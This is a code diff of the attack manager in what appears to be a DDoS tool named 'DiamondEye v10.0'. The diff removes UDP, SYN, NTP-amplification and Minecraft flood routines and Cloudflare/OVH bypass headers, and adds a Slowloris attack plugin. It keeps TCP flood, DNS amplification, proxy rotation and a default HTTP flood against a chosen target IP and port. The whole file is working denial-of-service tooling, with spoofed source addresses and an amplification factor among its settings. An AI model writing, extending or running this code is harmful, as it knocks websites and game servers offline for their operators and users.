@@ -6,14 +6,28 @@ import psutil
 from typing import Dict, Any, Optional
 from colorama import Fore, Style
 
-from layers.layer4.tcp_flood import TCPFlood
-from layers.layer4.udp_flood import UDPFlood
-from layers.layer4.syn_flood import SYNFlood
-from layers.amplification.dns_amp import DNSAmplifier
-from layers.amplification.ntp_amp import NTPAmplifier
-from layers.protocols.minecraft import MinecraftFlood
-from proxy.manager import ProxyManager
-from bypass.techniques import BypassTechniques
+try:
+    from layers.layer4.tcp_flood import TCPFlood
+    from layers.amplification.dns_amp import DNSAmplifier
+    from proxy.manager import ProxyManager
+except ImportError as e:
+    print(f"{Fore.YELLOW}⚠️  Missing module: {e}. Some features disabled.{Style.RESET_ALL}")
+    
+    class TCPFlood:
+        def __init__(self, **kwargs): pass
+        async def start(self): pass
+    
+    class DNSAmplifier:
+        def __init__(self, **kwargs): pass
+        async def start(self): pass
+    
+    class ProxyManager:
+        def __init__(self): self.proxies = []
+        async def load_from_file(self, *args): pass
+        async def fetch_proxies(self): pass
+        async def check_all(self, *args): pass
+        def get_next_proxy(self): return None
+
 from core.resource_monitor import ResourceMonitor
 
 
@@ -40,9 +54,6 @@ class AttackManager:
     async def initialize(self):
         """Инициализация менеджера"""
         print(f"{Fore.CYAN}🔧 Initializing DiamondEye v10.0...{Style.RESET_ALL}")
-        
-        # Инициализация техник обхода
-        self.bypass_tech = BypassTechniques()
         
         # Инициализация прокси-менеджера
         if self.args.proxy_auto or self.args.proxy_file:
@@ -93,16 +104,10 @@ class AttackManager:
         try:
             if self.args.attack_type == 'tcp':
                 await self.start_tcp_attack()
-            elif self.args.attack_type == 'udp':
-                await self.start_udp_attack()
-            elif self.args.attack_type == 'syn':
-                await self.start_syn_attack()
             elif self.args.attack_type == 'dns':
                 await self.start_dns_amplification()
-            elif self.args.attack_type == 'ntp':
-                await self.start_ntp_amplification()
-            elif self.args.attack_type == 'minecraft':
-                await self.start_minecraft_attack()
+            elif self.args.attack_type == 'slowloris':
+                await self.start_slowloris_attack()
             else:
                 await self.start_http_attack()  # Layer7 по умолчанию
                 
@@ -130,35 +135,6 @@ class AttackManager:
         self.active_attack = flood
         await flood.start()
     
-    async def start_udp_attack(self):
-        """Запуск UDP флуда"""
-        print(f"{Fore.CYAN}🌀 UDP Flood targeting {self.args.target_ip}:{self.args.target_port}{Style.RESET_ALL}")
-        
-        flood = UDPFlood(
-            target_ip=self.args.target_ip,
-            target_port=self.args.target_port,
-            workers=self.args.workers * 3,
-            spoof_ip=self.args.spoof_ip,
-            packet_size=512
-        )
-        
-        self.active_attack = flood
-        await flood.start()
-    
-    async def start_syn_attack(self):
-        """Запуск SYN флуда"""
-        print(f"{Fore.CYAN}🎯 SYN Flood targeting {self.args.target_ip}:{self.args.target_port}{Style.RESET_ALL}")
-        
-        flood = SYNFlood(
-            target_ip=self.args.target_ip,
-            target_port=self.args.target_port,
-            workers=self.args.workers * 5,
-            spoof_ip=self.args.spoof_ip
-        )
-        
-        self.active_attack = flood
-        await flood.start()
-    
     async def start_dns_amplification(self):
         """Запуск DNS амплификации"""
         print(f"{Fore.CYAN}🌪️ DNS Amplification targeting {self.args.target_ip}{Style.RESET_ALL}")
@@ -172,43 +148,25 @@ class AttackManager:
         self.active_attack = amplifier
         await amplifier.start()
     
-    async def start_ntp_amplification(self):
-        """Запуск NTP амплификации"""
-        print(f"{Fore.CYAN}⏰ NTP Amplification targeting {self.args.target_ip}{Style.RESET_ALL}")
+    async def start_slowloris_attack(self):
+        """Запуск Slowloris атаки через плагин"""
+        from plugins.slowloris_plugin import SlowlorisPlugin
         
-        amplifier = NTPAmplifier(
-            target_ip=self.args.target_ip,
-            amplification_factor=556,  # NTP имеет высокий коэффициент
-            workers=self.args.workers
-        )
+        print(f"{Fore.CYAN}🐌 Starting Slowloris attack via plugin{Style.RESET_ALL}")
         
-        self.active_attack = amplifier
-        await amplifier.start()
-    
-    async def start_minecraft_attack(self):
-        """Запуск атаки на Minecraft сервер"""
-        print(f"{Fore.CYAN}⛏️ Minecraft Flood targeting {self.args.target_ip}:{self.args.target_port}{Style.RESET_ALL}")
+        plugin = SlowlorisPlugin()
+        await plugin.initialize({
+            'host': self.args.target_ip,
+            'port': self.args.target_port or 80,
+            'max_connections': self.args.workers * 50
+        })
         
-        attack = MinecraftFlood(
-            target_ip=self.args.target_ip,
-            target_port=self.args.target_port or 25565,
-            workers=self.args.workers * 2
-        )
-        
-        self.active_attack = attack
-        await attack.start()
+        self.active_attack = plugin
+        await plugin.execute(f"{self.args.target_ip}:{self.args.target_port or 80}")
     
     async def start_http_attack(self):
         """Запуск HTTP атаки (существующий код)"""
         from attack import DiamondEyeAttack
-        
-        # Настройка заголовков для обхода
-        headers = {}
-        if self.bypass_tech and self.args.bypass_technique != 'auto':
-            if self.args.bypass_technique == 'cloudflare':
-                headers.update(self.bypass_tech.cloudflare_headers())
-            elif self.args.bypass_technique == 'ovh':
-                headers.update(self.bypass_tech.ovh_bypass_headers())
         
         # Подготовка прокси
         proxy = self.args.proxy
@@ -240,8 +198,7 @@ class AttackManager:
             header_flood=self.args.header_flood,
             method_fuzz=self.args.method_fuzz,
             junk=self.args.junk,
-            random_host=self.args.random_host,
-            custom_headers=headers
+            random_host=self.args.random_host
         )
         
         self.active_attack = attack
@@ -261,6 +218,8 @@ class AttackManager:
                 self.active_attack.stop()
             elif hasattr(self.active_attack, 'shutdown'):
                 await self.active_attack.shutdown()
+            elif hasattr(self.active_attack, 'cleanup'):
+                await self.active_attack.cleanup()
         
         # Генерация отчета
         await self.generate_report()
